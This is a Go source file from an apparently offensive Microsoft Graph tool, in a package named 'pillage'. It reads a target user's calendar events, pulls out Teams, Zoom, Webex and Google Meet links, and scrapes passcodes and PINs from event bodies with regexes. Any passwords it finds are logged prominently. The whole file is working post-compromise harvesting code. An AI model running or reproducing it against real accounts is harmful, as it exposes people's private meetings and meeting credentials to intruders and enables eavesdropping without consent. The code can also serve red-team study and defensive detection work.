package pillage

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"

	"github.com/graphrunner/internal/graph"
	"github.com/graphrunner/internal/output"
)

// CalendarResult holds calendar enumeration results.
type CalendarResult struct {
	UserID      string                   `json:"user_id"`
	TotalEvents int                      `json:"total_events"`
	MeetingURLs []MeetingLink            `json:"meeting_urls"`
	Events      []map[string]interface{} `json:"events"`
}

// MeetingLink holds an extracted meeting URL with context.
type MeetingLink struct {
	Subject  string `json:"subject"`
	Start    string `json:"start"`
	Provider string `json:"provider"` // teams, zoom, webex, etc.
	URL      string `json:"url"`
	Password string `json:"password,omitempty"`
}

var (
	// Meeting URL patterns
	zoomPattern  = regexp.MustCompile(`https://[a-z0-9.-]*zoom\.us/[js]/[^\s"'<>]+`)
	teamsPattern = regexp.MustCompile(`https://teams\.microsoft\.com/l/meetup-join/[^\s"'<>]+`)
	webexPattern = regexp.MustCompile(`https://[a-z0-9.-]*webex\.com/[^\s"'<>]+`)
	meetPattern  = regexp.MustCompile(`https://meet\.google\.com/[a-z-]+`)
	// Password hints in body
	pwPattern = regexp.MustCompile(`(?i)(?:passcode|password|pwd|pin)[:\s]+([^\s<\n]{4,32})`)
)

// ReadCalendar reads calendar events and extracts meeting links and passwords.
func ReadCalendar(ctx context.Context, client *graph.Client, userID string, top int) (*CalendarResult, error) {
	var endpoint string
	if userID == "" || userID == "me" {
		endpoint = graph.EndpointMeEvents
		userID = "me"
	} else {
		endpoint = fmt.Sprintf(graph.EndpointUserEvents, userID)
	}

	output.Info("Reading calendar events for %s (top %d)...", userID, top)

	raw, err := client.GetAll(ctx, endpoint, map[string]string{
		"$select":  "id,subject,start,end,location,organizer,attendees,body,onlineMeeting,onlineMeetingUrl,isOnlineMeeting",
		"$top":     fmt.Sprintf("%d", top),
		"$orderby": "start/dateTime desc",
	})
	if err != nil {
		return nil, fmt.Errorf("get events: %w", err)
	}

	result := &CalendarResult{UserID: userID, TotalEvents: len(raw)}

	for _, r := range raw {
		var event map[string]interface{}
		json.Unmarshal(r, &event)

		subject, _ := event["subject"].(string)
		startObj, _ := event["start"].(map[string]interface{})
		startTime := ""
		if startObj != nil {
			startTime, _ = startObj["dateTime"].(string)
			if len(startTime) > 19 {
				startTime = startTime[:19]
			}
		}

		output.Verbose("  [%s] %s", startTime, subject)

		// Extract body text for meeting URLs and passwords
		body, _ := event["body"].(map[string]interface{})
		bodyContent := ""
		if body != nil {
			bodyContent, _ = body["content"].(string)
		}

		// Also check onlineMeetingUrl field
		onlineMeetingURL, _ := event["onlineMeetingUrl"].(string)

		allText := bodyContent + " " + onlineMeetingURL

		// Extract meeting links
		extractLinks := func(pattern *regexp.Regexp, provider string) {
			matches := pattern.FindAllString(allText, -1)
			for _, url := range matches {
				link := MeetingLink{
					Subject:  subject,
					Start:    startTime,
					Provider: provider,
					URL:      url,
				}
				// Look for password near this URL in body
				if pwMatch := pwPattern.FindStringSubmatch(bodyContent); len(pwMatch) > 1 {
					link.Password = strings.TrimSpace(pwMatch[1])
				}
				result.MeetingURLs = append(result.MeetingURLs, link)
				if link.Password != "" {
					output.Warn("  MEETING+PWD [%s] %s — %s (pwd: %s)", provider, startTime, subject, link.Password)
				} else {
					output.Verbose("  MEETING [%s] %s — %s", provider, startTime, subject)
				}
			}
		}

		extractLinks(teamsPattern, "teams")
		extractLinks(zoomPattern, "zoom")
		extractLinks(webexPattern, "webex")
		extractLinks(meetPattern, "meet")

		result.Events = append(result.Events, event)
	}

	output.Success("Calendar: %d events | %d meeting URLs extracted",
		result.TotalEvents, len(result.MeetingURLs))
	return result, nil
}
